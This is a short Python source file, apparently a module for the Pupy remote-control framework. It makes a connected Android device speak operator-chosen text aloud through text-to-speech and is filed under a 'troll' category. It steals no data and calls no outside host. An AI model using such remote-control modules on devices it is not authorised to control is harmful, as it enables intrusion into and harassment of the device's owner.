# -*- coding: UTF8 -*-
from pupylib.PupyModule import *

__class_name__="AndroidTTS"

@config(compat="android", cat="troll", tags=["speech", "speak", "sound"])
class AndroidTTS(PupyModule):
    """ Use Android text to speach to say something :) """
    dependencies=['pupydroid.text_to_speech']
    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="tts", description=self.__doc__)
        self.arg_parser.add_argument('--lang', default='US', help='change the locale')
        self.arg_parser.add_argument('text', help='text to speak out loud')

    def run(self, args):
        self.client.conn.modules['pupydroid.text_to_speech'].speak(args.text, lang=args.lang)
        self.success("The truth has been spoken !")

